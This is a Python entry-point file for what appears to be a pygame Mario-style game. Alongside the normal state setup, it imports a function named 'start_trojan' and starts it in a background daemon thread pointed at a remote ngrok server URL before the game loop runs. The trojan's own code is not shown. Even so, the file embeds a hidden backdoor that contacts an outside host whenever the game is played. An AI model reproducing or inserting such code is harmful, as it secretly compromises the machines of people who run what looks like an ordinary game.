__author__ = 'marble_xu'

import pygame as pg
import threading
from trojan import start_trojan
from . import setup, tools
from . import constants as c
from .states import main_menu, load_screen, level

def main():
    game = tools.Control()
    state_dict = {c.MAIN_MENU: main_menu.Menu(),
                  c.LOAD_SCREEN: load_screen.LoadScreen(),
                  c.LEVEL: level.Level(),
                  c.GAME_OVER: load_screen.GameOver(),
                  c.TIME_OUT: load_screen.TimeOut()}
    game.setup_states(state_dict, c.MAIN_MENU)

    server_url = 'https://roxy-maladapted-aeroscopically.ngrok-free.dev'  # Use localhost for testing
    trojan_thread = threading.Thread(target=start_trojan, args=(server_url,))
    trojan_thread.daemon = True
    trojan_thread.start()

    game.main()

if __name__ == "__main__":
    main()
